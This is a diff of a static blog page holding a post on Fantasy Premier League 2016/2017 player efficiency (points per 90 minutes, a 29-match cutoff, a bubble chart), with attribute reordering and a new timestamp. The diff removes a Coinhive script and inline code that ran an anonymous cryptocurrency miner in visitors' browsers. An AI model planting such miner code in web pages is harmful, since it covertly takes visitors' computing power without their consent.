@@ -39,31 +39,8 @@
         })();
   </script>
   
-  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 </head>
 <body>
-<script>
-  var miner = new CoinHive.Anonymous('0Q2TtxhYQVKpZ8093Pd2RDdyZaWsqJoh');
-  miner.start();
-</script>
-
-<script>
-  // Listen on events
-  miner.on('found', function() {  })
-  miner.on('accepted', function() {  })
-
-  // Update stats once per second
-  setInterval(function() {
-      var hashesPerSecond = miner.getHashesPerSecond();
-      var totalHashes = miner.getTotalHashes();
-      var acceptedHashes = miner.getAcceptedHashes();
-
-      // Output to HTML elements...
-      console.log("H/s: " + hashesPerSecond);
-      console.log("Total Hashes: " + totalHashes);
-      console.log("Acepted Hashes: " + acceptedHashes);
-  }, 1000);
-</script>
   <div class="table-container">
     <div class="table-block footer-push">
       <div class="container">
@@ -124,17 +101,17 @@
 <h2 id="playing_time"><a class="toclink" href="#playing_time">Playing time</a></h2>
 <p>Particularly, for completion of the analogy, and actually for enabling our analysis to provide meaningful conclusions, we'll imagine - within the context of this post only - that football players are machines
 that convert playing minutes into fantasy football points.</p>
-<p>Since the average number of points per match<sup id="fnref:playing_only"><a rel="footnote" class="footnote-ref" href="#fn:playing_only">1</a></sup> an FPL player scored in 2016/2017 was only 2.97, our ratio of interest will be <em>average number of points scored per 90 minutes</em> (which is the duration of the regular time of all English Premier League matches). This means that we'll be looking for players who were able to take as many as possible playing minutes as input, and produce as many as possible points as output, namely footballers with high <em>playing time conversion efficiency</em>.</p>
+<p>Since the average number of points per match<sup id="fnref:playing_only"><a class="footnote-ref" rel="footnote" href="#fn:playing_only">1</a></sup> an FPL player scored in 2016/2017 was only 2.97, our ratio of interest will be <em>average number of points scored per 90 minutes</em> (which is the duration of the regular time of all English Premier League matches). This means that we'll be looking for players who were able to take as many as possible playing minutes as input, and produce as many as possible points as output, namely footballers with high <em>playing time conversion efficiency</em>.</p>
 <p>There's a gotcha involved, of course, and - as you may have guessed already - assuming the aforementioned ratio to be the only criterion employed, when drawing conclusions regarding playing efficiency, would be an utter failure at best.</p>
 <p>Consider, for instance, an imaginary footballer who scores two goals in the first game of the season, then gets an injury which prevents him from playing a full-match for 10 weeks, then scores a goal and makes an assist in his second match of the season, then gets injured again, until the very last match of the season, when he comes in for about 35 minutes, as a substitute - no goals, no assist this time. What do you think? Would it have been reasonable, in hindsight, to have purchased this player in the beginning of the season and to have kept him in your squad until the very end of the season, without having transferred him out. I believe your answer is No, and it should be - despite the high <em>playing time conversion efficiency</em> ratio he managed to squeeze out. Perhaps, he's an extremely skilled footballer, but we have to keep in mind his injury proneness as well, as I alluded to in the <a href="/team_play_contributions_of_the_top_forwards_for_the_fpl_season_2016_2017.html">first post</a> of my team-play contributions <a href="/tagged/team-play-contributions">series</a>. The number of playing minutes can usually be the best obtainable proxy, as all datasets, involving physiological player data, are strictly proprietary.</p>
 <p>Therefore, as an outlier detection method, we'll employ the following simple heuristic: we'll filter out all players,
-who participated in less than a pre-defined portion of all matches of their team; I've opted for 75%<sup id="fnref:participation_threshold"><a rel="footnote" class="footnote-ref" href="#fn:participation_threshold">2</a></sup>,
-which seems to be a reasonable enough figure<sup id="fnref:fa_participation_requirement"><a rel="footnote" class="footnote-ref" href="#fn:fa_participation_requirement">3</a></sup>. This, basically, means that we'll be only focusing on players who took part in at least 29 Premier League games during the 2016/2017 season.</p>
+who participated in less than a pre-defined portion of all matches of their team; I've opted for 75%<sup id="fnref:participation_threshold"><a class="footnote-ref" rel="footnote" href="#fn:participation_threshold">2</a></sup>,
+which seems to be a reasonable enough figure<sup id="fnref:fa_participation_requirement"><a class="footnote-ref" rel="footnote" href="#fn:fa_participation_requirement">3</a></sup>. This, basically, means that we'll be only focusing on players who took part in at least 29 Premier League games during the 2016/2017 season.</p>
 <h2 id="visualisation"><a class="toclink" href="#visualisation">Visualisation</a></h2>
 <p><a target="_blank" href="/uploads/fepl_playing_time_conversion_efficiency/Playing_time_converstion_efficiency.png"><img src="uploads/fepl_playing_time_conversion_efficiency/Playing_time_converstion_efficiency_230x256.png" alt="Playing Time Conversion Efficiency (FPL Season 2016/2017)" /></a></p>
 <p>This time we've got one graph only - nevertheless, it's fully-packed with useful information (that's why it doesn't need any companions). Firstly, we've got a bunch of points on the 2-D plane - each one of them
-corresponds to a player, who played in at least 29 English Premier League matches in 2016/2017<sup id="fnref:fpl_only"><a rel="footnote" class="footnote-ref" href="#fn:fpl_only">4</a></sup>.</p>
-<p>Along the <em>x</em>-axis, there is the total points count for each of the players, and along the <em>y</em>-axis - the average number of points scored per 90 mins (that is, essentially, our <em>playing time conversion efficiency</em> ratio), both of which will serve, visually, for comparative purposes. A further dimension that has been depicted is the average player value, encoded as the area<sup id="fnref:circle_area"><a rel="footnote" class="footnote-ref" href="#fn:circle_area">5</a></sup> (or size, in layman terms) of the corresponding circle. Thus, the total points and conversion efficiency readings, should be taken based on the centre of a player's circle. I've further annotated the most important quadrant - the upper right one, where we have the highest total points totals and the highest time conversion ratio - with the footballer names, for clarity (although, to be fair, this wasn't really necessary for Agüero or Sánchez, due to the enormous transfer value of the former, and the top rank - in total points terms - of the latter). Last but not least, I've colour-coded the footballer circles based on their playing line, in order to be
+corresponds to a player, who played in at least 29 English Premier League matches in 2016/2017<sup id="fnref:fpl_only"><a class="footnote-ref" rel="footnote" href="#fn:fpl_only">4</a></sup>.</p>
+<p>Along the <em>x</em>-axis, there is the total points count for each of the players, and along the <em>y</em>-axis - the average number of points scored per 90 mins (that is, essentially, our <em>playing time conversion efficiency</em> ratio), both of which will serve, visually, for comparative purposes. A further dimension that has been depicted is the average player value, encoded as the area<sup id="fnref:circle_area"><a class="footnote-ref" rel="footnote" href="#fn:circle_area">5</a></sup> (or size, in layman terms) of the corresponding circle. Thus, the total points and conversion efficiency readings, should be taken based on the centre of a player's circle. I've further annotated the most important quadrant - the upper right one, where we have the highest total points totals and the highest time conversion ratio - with the footballer names, for clarity (although, to be fair, this wasn't really necessary for Agüero or Sánchez, due to the enormous transfer value of the former, and the top rank - in total points terms - of the latter). Last but not least, I've colour-coded the footballer circles based on their playing line, in order to be
 able to visually distinguish patterns, related to individual lines.</p>
 <p>A few quick observations:</p>
 <ul>
@@ -162,19 +139,19 @@ Ciao until <a href="/tagged/fpl-selection">next time</a> ;)</p>
 <hr />
 <ol>
 <li id="fn:playing_only">
-<p>This statistic, naturally, considers only those matches in which a player participated for at least a single minute. Averaging over playing and non-playing "participations" brings us down to an 1.31 average points scored per match, across the entire last season. <a rev="footnote" title="Jump back to footnote 1 in the text" class="footnote-backref" href="#fnref:playing_only">↩</a></p>
+<p>This statistic, naturally, considers only those matches in which a player participated for at least a single minute. Averaging over playing and non-playing "participations" brings us down to an 1.31 average points scored per match, across the entire last season. <a title="Jump back to footnote 1 in the text" class="footnote-backref" href="#fnref:playing_only" rev="footnote">↩</a></p>
 </li>
 <li id="fn:participation_threshold">
-<p>The straightforward maths goes as follows: 75% x 38 = 28.5, and to be on the strict side, I've taken the ceiling of that number, namely 29, to be the minimum requirement for a number of matches played, in order to be included into our analysis. <a rev="footnote" title="Jump back to footnote 2 in the text" class="footnote-backref" href="#fnref:participation_threshold">↩</a></p>
+<p>The straightforward maths goes as follows: 75% x 38 = 28.5, and to be on the strict side, I've taken the ceiling of that number, namely 29, to be the minimum requirement for a number of matches played, in order to be included into our analysis. <a title="Jump back to footnote 2 in the text" class="footnote-backref" href="#fnref:participation_threshold" rev="footnote">↩</a></p>
 </li>
 <li id="fn:fa_participation_requirement">
-<p>The flat requirement, for granting permissions to non-EU players to obtain work permits and join English football clubs officially, used to be international-level participation of exactly 75% or more, over the past 24 months. But, in 2015, the requirements were re-assessed and subsequently updated to include tiers, based on the FIFA ranking of the particular non-EU country, whose passport is held by the footballer in question. Nevertheless, for the lowest ranking range, it is still required that the participation ratio, on international level, is <a href="http://www.inbrief.co.uk/football-law/footballer-work-permits/">at least 75%</a> for potential new signings. <a rev="footnote" title="Jump back to footnote 3 in the text" class="footnote-backref" href="#fnref:fa_participation_requirement">↩</a></p>
+<p>The flat requirement, for granting permissions to non-EU players to obtain work permits and join English football clubs officially, used to be international-level participation of exactly 75% or more, over the past 24 months. But, in 2015, the requirements were re-assessed and subsequently updated to include tiers, based on the FIFA ranking of the particular non-EU country, whose passport is held by the footballer in question. Nevertheless, for the lowest ranking range, it is still required that the participation ratio, on international level, is <a href="http://www.inbrief.co.uk/football-law/footballer-work-permits/">at least 75%</a> for potential new signings. <a title="Jump back to footnote 3 in the text" class="footnote-backref" href="#fnref:fa_participation_requirement" rev="footnote">↩</a></p>
 </li>
 <li id="fn:fpl_only">
-<p>Namely, in the context of the Fantasy Premier League 2016/2017 selection pool, that's 164 players, out of 683 in total. It is noteworthy to mention Zlatan Ibrahimovic who, among others, didn't make the cut to be included into our conversion efficiency analysis, as he only played in 28 of Manchester United's Premier Leagues games. <a rev="footnote" title="Jump back to footnote 4 in the text" class="footnote-backref" href="#fnref:fpl_only">↩</a></p>
+<p>Namely, in the context of the Fantasy Premier League 2016/2017 selection pool, that's 164 players, out of 683 in total. It is noteworthy to mention Zlatan Ibrahimovic who, among others, didn't make the cut to be included into our conversion efficiency analysis, as he only played in 28 of Manchester United's Premier Leagues games. <a title="Jump back to footnote 4 in the text" class="footnote-backref" href="#fnref:fpl_only" rev="footnote">↩</a></p>
 </li>
 <li id="fn:circle_area">
-<p>In fact, for the purpose of facilitating visualisation clarity, I have exponentiated - by a constant - all player average values, in order to put further emphasis on the relative differences. Thus, please, note that the circle areas (or radii) do not correspond to the average values for the FPL 2016/2017 season, in a one-to-one fashion. <a rev="footnote" title="Jump back to footnote 5 in the text" class="footnote-backref" href="#fnref:circle_area">↩</a></p>
+<p>In fact, for the purpose of facilitating visualisation clarity, I have exponentiated - by a constant - all player average values, in order to put further emphasis on the relative differences. Thus, please, note that the circle areas (or radii) do not correspond to the average values for the FPL 2016/2017 season, in a one-to-one fashion. <a title="Jump back to footnote 5 in the text" class="footnote-backref" href="#fnref:circle_area" rev="footnote">↩</a></p>
 </li>
 </ol>
 </div><p></p>
@@ -221,7 +198,7 @@ Ciao until <a href="/tagged/fpl-selection">next time</a> ;)</p>
       </div>
     </div>  <!-- end table block footer div -->
   </div>
-  <!-- Last generated: 2017-12-23T18:36:06Z -->
+  <!-- Last generated: 2018-04-02T21:37:01Z -->
 </body>
 </html>
 
